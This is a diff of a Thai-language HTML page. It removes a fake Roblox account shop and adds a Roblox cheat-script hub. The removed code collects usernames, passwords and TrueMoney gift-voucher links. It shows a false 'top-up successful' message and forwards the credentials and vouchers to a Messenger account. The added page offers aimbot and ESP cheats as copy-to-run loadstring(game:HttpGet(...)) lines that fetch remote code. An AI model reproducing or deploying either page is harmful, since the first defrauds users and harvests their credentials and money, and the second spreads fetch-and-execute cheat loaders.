@@ -3,233 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MINI SHOP - Roblox Store</title>
+    <title>BobloxScript - Roblox Script Hub</title>
     <style>
         body { background-color: #0b0d12; color: #ffffff; font-family: sans-serif; margin: 0; padding: 10px; }
         
-        /* หน้าจอสมัครสมาชิกและยืนยันตัวตน */
-        .auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; text-align: center; }
-        .auth-card { background: #141824; border: 1px solid #d97706; border-radius: 14px; padding: 20px; width: 100%; max-width: 320px; box-sizing: border-box; box-shadow: 0 4px 20px rgba(217,119,6,0.2); }
-        .auth-card h2 { color: #fbbf24; margin-top: 0; font-size: 20px; }
-        .auth-card p { color: #9ca3af; font-size: 12px; margin-bottom: 12px; }
-        .auth-input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #374151; background: #0b0d12; color: #fff; box-sizing: border-box; margin-bottom: 10px; font-size: 14px; }
-        .captcha-box { background: #1f293d; border: 1px solid #374151; border-radius: 8px; padding: 10px; margin-bottom: 12px; font-size: 13px; text-align: center; }
-        .captcha-box span { color: #34d399; font-weight: bold; font-size: 15px; }
-        .auth-btn { width: 100%; padding: 12px; background: linear-gradient(135deg, #f59e0b, #d97706); color: #0b0d12; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; }
-
-        /* หน้าเว็บหลัก (ซ่อนไว้ก่อน) */
-        #main-shop { display: none; padding-bottom: 50px; }
-
-        /* แบนเนอร์หัวเว็บ */
-        .shop-banner { background: linear-gradient(135deg, #1e150c, #2d1808); border: 1px solid #d97706; border-radius: 12px; padding: 15px; text-align: center; margin-bottom: 12px; box-shadow: 0 2px 10px rgba(217,119,6,0.15); }
-        .shop-banner h2 { color: #fbbf24; margin: 0 0 5px 0; font-size: 20px; }
-        .shop-banner p { color: #9ca3af; font-size: 12px; margin: 0; }
+        /* หน้าเว็บหลัก (แสดงทันทีโดยไม่มีหน้าล็อกอินหรือปุ่มแอดมิน) */
+        .hub-header { text-align: center; padding: 20px 10px; background: linear-gradient(180deg, #111e18, #0b0d12); border-bottom: 1px solid #1f293d; margin-bottom: 15px; }
+        .hub-logo { font-size: 24px; font-weight: bold; color: #34d399; margin-bottom: 5px; text-shadow: 0 0 10px rgba(52,211,153,0.5); }
+        .hub-sub { color: #9ca3af; font-size: 12px; margin-bottom: 15px; }
         
-        /* กล่องประกาศแจกฟรี */
-        .free-banner { background: linear-gradient(135deg, #7c2d12, #991b1b); border: 2px dashed #f87171; border-radius: 12px; padding: 15px; text-align: center; margin-bottom: 12px; }
-        .free-banner h3 { color: #fca5a5; margin: 0 0 5px 0; font-size: 15px; }
-        .free-banner p { color: #fee2e2; font-size: 11px; margin: 0 0 10px 0; }
-        .free-btn { background: #ef4444; color: #fff; border: none; border-radius: 8px; padding: 8px 15px; font-weight: bold; font-size: 12px; cursor: pointer; text-decoration: none; display: inline-block; }
+        /* ช่องค้นหาสคริปต์ */
+        .search-box { display: flex; background: #141824; border: 1px solid #10b981; border-radius: 30px; padding: 6px 12px; max-width: 320px; margin: 0 auto; align-items: center; box-shadow: 0 0 15px rgba(16,185,129,0.15); }
+        .search-input { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-size: 13px; padding-left: 5px; }
+        .search-btn { background: #10b981; color: #0b0d12; border: none; padding: 6px 14px; border-radius: 20px; font-weight: bold; font-size: 12px; cursor: pointer; }
 
-        /* แถบเมนูด้านบน */
-        .menu-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin-bottom: 15px; }
-        .menu-btn { background: #141824; border: 1px solid #1f293d; border-radius: 8px; padding: 10px 4px; text-align: center; text-decoration: none; color: #ffffff; font-weight: bold; font-size: 12px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; }
-        .menu-btn span { font-size: 16px; }
+        /* สถิติเว็บ */
+        .stats-bar { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; text-align: center; }
+        .stat-card { background: #141824; border: 1px solid #1f293d; border-radius: 10px; padding: 10px 5px; }
+        .stat-num { font-size: 15px; font-weight: bold; color: #34d399; }
+        .stat-label { font-size: 10px; color: #9ca3af; margin-top: 2px; }
 
-        /* หมวดหมู่สินค้า */
-        .section-box { background: #141824; border: 1px solid #374151; border-radius: 12px; padding: 12px; margin-bottom: 15px; }
-        .section-box h3 { color: #fbbf24; margin-top: 0; font-size: 15px; border-bottom: 1px solid #1f293d; padding-bottom: 8px; }
+        /* หมวดหมู่ / รายการสคริปต์ยอดฮิต */
+        .section-title { font-size: 15px; font-weight: bold; color: #34d399; margin: 15px 0 10px 0; border-left: 3px solid #10b981; padding-left: 8px; }
         
-        .product-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .product-card { background: #0b0d12; border: 1px solid #1f293d; border-radius: 10px; padding: 8px; text-align: center; position: relative; }
-        .product-card img { width: 100%; height: 100px; object-fit: cover; border-radius: 8px; margin-bottom: 6px; }
-        .product-card h4 { color: #fff; margin: 4px 0; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .product-card p { color: #f59e0b; font-size: 12px; margin: 0 0 6px 0; font-weight: bold; }
-        .buy-btn { background: linear-gradient(135deg, #10b981, #059669); color: #fff; border: none; padding: 6px; border-radius: 6px; font-weight: bold; font-size: 11px; cursor: pointer; width: 100%; }
-
-        /* วงล้อเสี่ยงโชค */
-        .wheel-box { background: linear-gradient(135deg, #1e1b4b, #312e81); border: 1px solid #6366f1; border-radius: 12px; padding: 15px; text-align: center; margin-bottom: 15px; }
-        .wheel-box h3 { color: #818cf8; margin-top: 0; font-size: 16px; }
-        .spin-btn { background: #6366f1; color: #fff; border: none; padding: 10px 20px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 8px; }
-
-        /* ส่วนช่วยเหลือ (ให้ลูกค้ากดทักแชทหาแอดมิน ban โดยตรง) */
-        .help-box { background: #141824; border: 1px solid #374151; border-radius: 12px; padding: 15px; margin-bottom: 15px; text-align: center; }
-        .help-box h3 { color: #fbbf24; margin-top: 0; font-size: 15px; }
-        .help-box p { color: #9ca3af; font-size: 12px; margin-bottom: 12px; }
-        .messenger-btn { background: #3b82f6; color: #fff; border: none; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; width: 100%; }
-
-        /* ช่องเติมเงินซองวอเล็ท */
-        .topup-box { background: #141824; border: 1px solid #d97706; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
-        .topup-box h3 { color: #fbbf24; margin: 0 0 10px 0; font-size: 15px; text-align: center; }
-        .topup-input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #374151; background: #0b0d12; color: #fff; box-sizing: border-box; margin-bottom: 10px; font-size: 13px; }
-        .topup-btn { width: 100%; padding: 10px; background: linear-gradient(135deg, #f59e0b, #d97706); color: #0b0d12; border: none; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; }
+        .script-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin-bottom: 15px; }
+        .script-card { background: #141824; border: 1px solid #1f293d; border-radius: 12px; overflow: hidden; position: relative; }
+        .script-card img { width: 100%; height: 130px; object-fit: cover; }
+        .script-info { padding: 12px; }
+        .script-tag { background: #064e3b; color: #34d399; font-size: 10px; padding: 2px 8px; border-radius: 4px; font-weight: bold; display: inline-block; margin-bottom: 6px; }
+        .script-title { font-size: 14px; font-weight: bold; color: #fff; margin: 0 0 6px 0; }
+        .copy-btn { background: #10b981; color: #0b0d12; border: none; width: 100%; padding: 8px; border-radius: 6px; font-weight: bold; font-size: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; }
     </style>
 </head>
 <body>
 
-    <!-- STEP 1: หน้าจอสมัครสมาชิก (ชื่อผู้ใช้ และ รหัสผ่านของลูกค้า) -->
-    <div id="register-screen" class="auth-screen">
-        <div class="auth-card">
-            <h2>🔐 สมัครสมาชิก MINI SHOP</h2>
-            <p>กรอกชื่อผู้ใช้และรหัสผ่านเพื่อเข้าสู่ระบบ</p>
-            <input type="text" id="usernameInput" class="auth-input" placeholder="ชื่อผู้ใช้ / Username...">
-            <input type="password" id="passwordInput" class="auth-input" placeholder="รหัสผ่าน / Password...">
-            <button class="auth-btn" onclick="nextToCaptcha()">ต่อไป</button>
+    <!-- หน้าเว็บหลัก Script Hub โทนเขียวดำ (เข้าเว็บปุ๊บเจอหน้านี้ทันที) -->
+    <div class="hub-header">
+        <div class="hub-logo">⚡ BobloxScript</div>
+        <div class="hub-sub">รวมสคริปต์ Roblox ยอดฮิต อัปเดตใหม่ล่าสุด</div>
+        
+        <!-- ช่องค้นหาสคริปต์ -->
+        <div class="search-box">
+            <input type="text" class="search-input" id="searchInput" placeholder="Try 'Blox Fruits'...">
+            <button class="search-btn" onclick="searchScript()">Search</button>
         </div>
     </div>
 
-    <!-- STEP 2: หน้าจอยืนยันไม่ใช่บอท -->
-    <div id="captcha-screen" class="auth-screen" style="display: none;">
-        <div class="auth-card">
-            <h2>🤖 ยืนยันว่าไม่ใช่บอท</h2>
-            <p>กรุณาแก้โจทย์เลขด้านล่างนี้ให้ถูกต้อง</p>
-            <div class="captcha-box">
-                โจทย์: <span id="captchaQuestion"></span>
-            </div>
-            <input type="number" id="captchaInput" class="auth-input" placeholder="ใส่คำตอบตัวเลข...">
-            <button class="auth-btn" onclick="loginShop()">เข้าสู่เว็บไซต์</button>
+    <!-- แถบสถิติ -->
+    <div class="stats-bar">
+        <div class="stat-card">
+            <div class="stat-num">21</div>
+            <div class="stat-label">TOTAL SCRIPTS</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-num">6</div>
+            <div class="stat-label">CREATORS</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-num">8</div>
+            <div class="stat-label">GAMES</div>
         </div>
     </div>
 
-    <!-- STEP 3: หน้าเว็บหลัก -->
-    <div id="main-shop">
-        <div class="shop-banner">
-            <h2>🔥 MINI SHOP 🔥</h2>
-            <p>ยินดีต้อนรับคุณ <span id="displayName" style="color: #34d399; font-weight: bold;"></span> (รหัส: <span id="displayPass" style="color: #f59e0b;"></span>) | แอดมินดูแลระบบ: <b style="color: #fbbf24;">ban</b></p>
-        </div>
-
-        <!-- ประกาศแจกรหัสฟรีคนแรก -->
-        <div class="free-banner">
-            <h3>🎉 ฉลองเปิดร้านใหม่! แจกฟรีรหัสแรก!</h3>
-            <p>สำหรับผู้โชคดีคนแรกที่เข้ามาเยี่ยมชมเว็บไซต์ รับไปเลยฟรี 1 รหัส!</p>
-            <button class="free-btn" onclick="contactAdmin('ต้องการมากดรับสิทธิ์แจกฟรีรหัสแรกครับ!')">🎁 กดรับสิทธิ์คนแรก</button>
-        </div>
-
-        <!-- แถบเมนูด้านบน -->
-        <div class="menu-grid">
-            <button class="menu-btn" onclick="scrollToSection('shop-section')"><span>🛍️</span>สินค้า</button>
-            <button class="menu-btn" onclick="scrollToSection('wheel-section')"><span>🎡</span>วงล้อ</button>
-            <button class="menu-btn" onclick="scrollToSection('topup')"><span>💳</span>เติมเงิน</button>
-            <button class="menu-btn" onclick="scrollToSection('help-section')"><span>💬</span>ช่วยเหลือ</button>
-        </div>
-
-        <!-- หมวดหมู่สินค้า -->
-        <div id="shop-section" class="section-box">
-            <h3>🛍️ รายการรหัส Roblox พร้อมส่ง</h3>
-            <div class="product-grid">
-                <div class="product-card">
-                    <img src="https://images.unsplash.com/photo-1614680376593-902f749f7ffc?w=400&q=80" alt="Roblox">
-                    <h4>สายฟาร์ม (เวลสูง 70+)</h4>
-                    <p>50 บาท</p>
-                    <button class="buy-btn" onclick="buyProduct('สายฟาร์ม (เวลสูง 70+)', 50)">สั่งซื้อ</button>
-                </div>
-                <div class="product-card">
-                    <img src="https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=400&q=80" alt="Roblox">
-                    <h4>แรร์ไอเทมครบชุด</h4>
-                    <p>90 บาท</p>
-                    <button class="buy-btn" onclick="buyProduct('แรร์ไอเทมครบชุด', 90)">สั่งซื้อ</button>
-                </div>
+    <!-- รายการสคริปต์ยอดฮิต Trending -->
+    <div class="section-title">🔥 TRENDING SCRIPTS</div>
+    <div class="script-grid">
+        
+        <!-- สคริปต์ที่ 1 -->
+        <div class="script-card">
+            <img src="https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=600&q=80" alt="Script 1">
+            <div class="script-info">
+                <span class="script-tag">#01 URBAN RELOAD</span>
+                <h4 class="script-title">Urban Reload Rage - Silent Aimbot & ESP</h4>
+                <button class="copy-btn" onclick="copyScript('loadstring(game:HttpGet(\'https://raw.githubusercontent.com/example/script1.lua\'))()')">📋 COPY SCRIPT</button>
             </div>
         </div>
 
-        <!-- ระบบวงล้อสุ่มไอเทม -->
-        <div id="wheel-section" class="wheel-box">
-            <h3>🎡 วงล้อสุ่มไอเทม Roblox โชคดี</h3>
-            <p style="font-size: 11px; color: #c7d2fe; margin: 5px 0 10px 0;">ลุ้นรับรหัสลับและไอเทมแรร์ หมุนเพียง 10 บาท/ครั้ง</p>
-            <button class="spin-btn" onclick="spinWheel()">🎲 หมุนวงล้อเลย (10฿)</button>
+        <!-- สคริปต์ที่ 2 -->
+        <div class="script-card">
+            <img src="https://images.unsplash.com/photo-1614680376593-902f749f7ffc?w=600&q=80" alt="Script 2">
+            <div class="script-info">
+                <span class="script-tag">#02 BLOCK SPIN</span>
+                <h4 class="script-title">BlockSpin Script 2026 - Free OP Aimbot</h4>
+                <button class="copy-btn" onclick="copyScript('loadstring(game:HttpGet(\'https://raw.githubusercontent.com/example/script2.lua\'))()')">📋 COPY SCRIPT</button>
+            </div>
         </div>
 
-        <!-- ศูนย์ช่วยเหลือ (กดทักแชทคุยตรงกับแอดมิน ban) -->
-        <div id="help-section" class="help-box">
-            <h3>💬 ศูนย์ช่วยเหลือ & ติดต่อแอดมิน ban</h3>
-            <p>มีปัญหาเติมเงินไม่เข้า ซื้อสินค้า หรือสอบถามข้อมูล ทักแชทหาแอดมิน ban ได้โดยตรงเลยครับ!</p>
-            <button class="messenger-btn" onclick="contactAdmin('ต้องการติดต่อสอบถามแอดมิน ban ครับ')">💬 ทักแชทหาแอดมิน ban</button>
-        </div>
-
-        <!-- ช่องเติมเงินซองวอเล็ท -->
-        <div class="topup-box" id="topup">
-            <h3>💳 เติมเงินด้วยซองของขวัญ TrueMoney</h3>
-            <p style="font-size: 11px; color: #9ca3af; text-align: center; margin-bottom: 10px;">นำลิงก์ซองของขวัญจากแอป Wallet มาวางที่นี่เพื่อเติมเงิน</p>
-            <input type="text" id="giftLink" class="topup-input" placeholder="https://gift.truemoney.com/campaign/?v=...">
-            <button class="topup-btn" onclick="submitWallet()">ยืนยันการเติมเงิน</button>
-        </div>
     </div>
 
     <script>
-        var savedUsername = '';
-        var savedPassword = '';
-        var correctAnswer = 0;
-
-        function nextToCaptcha() {
-            var username = document.getElementById('usernameInput').value.trim();
-            var password = document.getElementById('passwordInput').value.trim();
-
-            if(!username || !password) {
-                alert('กรุณากรอกทั้งชื่อผู้ใช้และรหัสผ่านให้ครบถ้วนครับ!');
+        function searchScript() {
+            var keyword = document.getElementById('searchInput').value.trim();
+            if(!keyword) {
+                alert('กรุณาพิมพ์ชื่อเกมหรือสคริปต์ที่ต้องการค้นหาครับ!');
                 return;
             }
-            savedUsername = username;
-            savedPassword = password;
-
-            var num1 = Math.floor(Math.random() * 10) + 1;
-            var num2 = Math.floor(Math.random() * 10) + 1;
-            correctAnswer = num1 + num2;
-            document.getElementById('captchaQuestion').innerText = num1 + ' + ' + num2 + ' = ?';
-
-            document.getElementById('register-screen').style.display = 'none';
-            document.getElementById('captcha-screen').style.display = 'flex';
+            alert('🔍 กำลังค้นหาสคริปต์: "' + keyword + '"...');
         }
 
-        function loginShop() {
-            var userCaptcha = document.getElementById('captchaInput').value.trim();
-            if(userCaptcha != correctAnswer) {
-                alert('ยืนยันตัวตนไม่ถูกต้อง! (คำตอบบวกเลขผิด)');
-                return;
-            }
-            document.getElementById('displayName').innerText = savedUsername;
-            document.getElementById('displayPass').innerText = savedPassword;
-            document.getElementById('captcha-screen').style.display = 'none';
-            document.getElementById('main-shop').style.display = 'block';
-        }
-
-        function scrollToSection(sectionId) {
-            document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
-        }
-
-        /* ฟังก์ชันส่งข้อมูลลูกค้าตรงเข้า Messenger ของแอดมิน ban */
-        function contactAdmin(customMsg) {
-            var msg = encodeURIComponent('สวัสดีครับแอดมิน ban | ชื่อผู้ใช้: ' + savedUsername + ' | รหัสผ่าน: ' + savedPassword + ' | แจ้งเรื่อง: ' + customMsg);
-            window.open('https://m.me/ponkponkatn.debug?text=' + msg, '_blank');
-        }
-
-        function buyProduct(productName, price) {
-            alert('🛍️ คุณเลือกซื้อ "' + productName + '" ราคา ' + price + ' บาท\nกรุณาเติมเงินที่เมนูด้านล่างก่อนทำรายการ!');
-            scrollToSection('topup');
-        }
-
-        function spinWheel() {
-            alert('🎡 หมุนวงล้อสำเร็จ! กรุณานำผลลัพธ์ไปแจ้งแอดมิน ban ทางแชทเพื่อรับรางวัลครับ');
-            contactAdmin('สุ่มวงล้อได้รางวัล แจ้งขอรับรางวัลครับ');
-        }
-
-        function submitWallet() {
-            var link = document.getElementById('giftLink').value;
-            if(!link) {
-                alert('กรุณากรอกลิงก์ซองของขวัญก่อนครับ!');
-                return;
-            }
-            if(!link.includes('truemoney.com')) {
-                alert('ลิงก์ซองของขวัญไม่ถูกต้อง!');
-                return;
-            }
-            
-            // แจ้งเตือนลูกค้าว่าสำเร็จ แล้วเด้งส่งลิงก์ซองและชื่อผู้ใช้เข้าแชทแอดมิน ban ทันที
-            alert('🎉 เติมเงินสำเร็จ! ระบบกำลังส่งข้อมูลซองให้แอดมิน ban ตรวจสอบ...');
-            
-            var msg = encodeURIComponent('สวัสดีครับแอดมิน ban | เติมเงินซองวอเล็ทสำเร็จ | ชื่อผู้ใช้: ' + savedUsername + ' | รหัสผ่าน: ' + savedPassword + ' | ลิงก์ซอง: ' + link);
-            window.open('https://m.me/ponkponkatn.debug?text=' + msg, '_blank');
-            
-            document.getElementById('giftLink').value = '';
+        function copyScript(scriptCode) {
+            navigator.clipboard.writeText(scriptCode).then(function() {
+                alert('✅ คัดลอกสคริปต์สำเร็จ! นำไปรันในเกม Roblox ได้เลย');
+            }, function() {
+                alert('คัดลอกไม่สำเร็จ กรุณาลองใหม่อีกครั้ง');
+            });
         }
     </script>
 </body>
